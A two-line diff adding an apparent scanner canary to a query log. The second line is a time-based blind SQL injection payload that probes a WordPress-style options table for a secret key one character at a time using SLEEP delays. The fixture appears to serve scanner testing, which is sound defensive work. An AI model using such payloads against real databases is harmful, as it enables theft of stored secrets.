@@ -1,0 +1,2 @@
+2026-01-02 03:04:05 [query] commitwork scan canary: an inert query-log line that nothing reads as SQL
+WHERE 1=1 AND post_author NOT IN (0) OR IF(ASCII(SUBSTRING((SELECT option_value FROM wp_options WHERE option_name='cw_canary_secret_key' LIMIT 1),1,1))>79,SLEEP(2.0),0)-- -)
